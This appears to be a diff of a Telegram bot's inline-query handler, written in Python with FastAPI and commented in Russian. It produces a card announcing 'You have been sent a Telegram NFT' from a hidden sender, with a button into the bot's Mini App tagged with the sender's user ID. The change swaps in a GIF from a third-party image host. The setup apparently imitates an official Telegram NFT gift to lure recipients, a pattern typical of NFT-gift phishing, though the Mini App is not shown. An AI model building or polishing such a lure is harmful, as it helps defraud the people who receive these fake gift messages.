@@ -2,7 +2,7 @@ from fastapi import FastAPI, HTTPException, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InlineQueryResultArticle, InputTextMessageContent
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InlineQueryResultArticle, InputTextMessageContent, InlineQueryResultGif
 from telegram.ext import Application, CommandHandler, ContextTypes, InlineQueryHandler
 import os
 from dotenv import load_dotenv
@@ -76,11 +76,8 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Ссылка на Mini App
     mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"
 
-    # TODO: Заменить на реальное название NFT и номер
     nft_name = "Lol Pop #130400"
-
-    # TODO: Заменить на публичный URL GIF (загрузи на imgur.com)
-    gif_url = "https://nft.fragment.com/telegram.gif"
+    gif_url = "https://www.image2url.com/r2/default/gifs/1786608979748-1a1ada2a-883d-429b-88a9-a945b82cec85.gif"
 
     # Создаём красивую карточку с кнопкой
     keyboard = [
@@ -88,20 +85,15 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
-    # Результат с текстом и кнопкой
+    # Используем InlineQueryResultGif чтобы показать GIF с текстом
     results = [
-        InlineQueryResultArticle(
+        InlineQueryResultGif(
             id="nft_gift",
-            title="🎁 Отправить Telegram NFT",
-            description="Получатель сможет забрать NFT одной кнопкой",
+            gif_url=gif_url,
             thumbnail_url=gif_url,
-            input_message_content=InputTextMessageContent(
-                message_text=(
-                    f"Вам отправлен Telegram NFT: **{nft_name}**\n\n"
-                    f"От: **Аккаунт скрыт**"
-                ),
-                parse_mode='Markdown'
-            ),
+            title="🎁 Отправить Telegram NFT",
+            caption=f"Вам отправлен Telegram NFT: **{nft_name}**\n\nОт: **Аккаунт скрыт**",
+            parse_mode='Markdown',
             reply_markup=reply_markup
         )
     ]
